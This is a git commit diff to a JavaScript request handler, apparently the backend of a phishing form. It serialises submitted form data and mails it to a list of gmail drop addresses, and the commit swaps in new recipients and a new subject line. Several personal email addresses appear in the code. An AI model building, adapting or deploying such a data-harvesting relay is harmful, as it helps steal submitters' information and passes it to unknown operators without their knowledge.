3fe9bfe0b676dd07009f4cd8a37dd0eaa4a77bc7
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-04-12 10:00:34 +0500

    Update and rename Destiny.js to TL.js

--- TL.js
+++ TL.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,metausa967@gmail.com",
-      subject: "Destiny 11",
+      to: "ta0134750@gmail.com,ganinizmaniabdol@gmail.com",
+      subject: "TL",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
